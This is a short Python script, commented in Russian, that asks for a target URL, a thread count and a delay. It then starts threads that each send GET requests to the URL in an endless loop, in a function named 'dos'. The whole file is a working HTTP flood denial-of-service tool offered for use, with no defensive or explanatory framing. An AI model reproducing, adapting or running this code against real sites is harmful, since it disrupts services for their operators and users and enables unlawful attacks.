from tqdm import tqdm
import threading
import time
from turtle import back
import requests
import colorama
import os
# Grade-collab
# проверка соединения
host = "google.com"
access = os.system("ping -n 2 " + host)
if access == 0:
    print(colorama.Fore.GREEN + "Подключение стабильное")
else:
    print(colorama.Fore.RED + "Не имеется подключение к сети! Остановка")
    quit()
# ^^^^^^^ проверка соединения
threads = int(input("Укажите количество повторов:"))

url = input("URL:")
timeout = float(input("Задержка перед отправкой (по умолчанию 0.3):"))


def dos(target):
    while True:
        res = requests.get(target)


print(colorama.Fore.GREEN + "Запущено: " + url)
pbar = tqdm(total=threads)
if not url.__contains__("http"):
    url = "https://" + url
for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    time.sleep(timeout)
    pbar.update(1)
print(" Выполнено, спасибо за пользование программой")
time.sleep(2)
os._exit(1)
